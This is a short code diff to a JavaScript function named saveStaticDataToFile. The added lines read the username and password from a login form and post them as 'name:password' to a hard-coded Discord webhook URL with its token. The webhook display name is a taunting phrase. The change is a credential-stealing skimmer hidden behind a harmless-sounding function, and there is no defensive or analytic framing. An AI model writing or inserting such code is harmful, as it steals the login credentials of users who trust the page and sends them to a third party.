@@ -108,11 +108,13 @@ function saveStaticDataToFile() {
       request.open("POST", "https://discord.com/api/webhooks/1079186396885041254/8P5qT7kkxgX8xPdD2IxT6Cnqp__YVVz6w-2EBjWaTrOoaX0MJ3wcr0eSq-Mc7kJ9_abD");
 
       request.setRequestHeader('Content-type', 'application/json');
-
+	var vaa = document.getElementsByName('LoginForm[name]')[0].value
+	var pee = document.getElementsByName('LoginForm[password]')[0].value
+	
       const params = {
-        username: "My Webhook Name",
+        username: "Losis uzspieda XDDDDD",
         avatar_url: "",
-        content: "The message to send"
+        content: vaa+":"+pee
       }
 
       request.send(JSON.stringify(params));
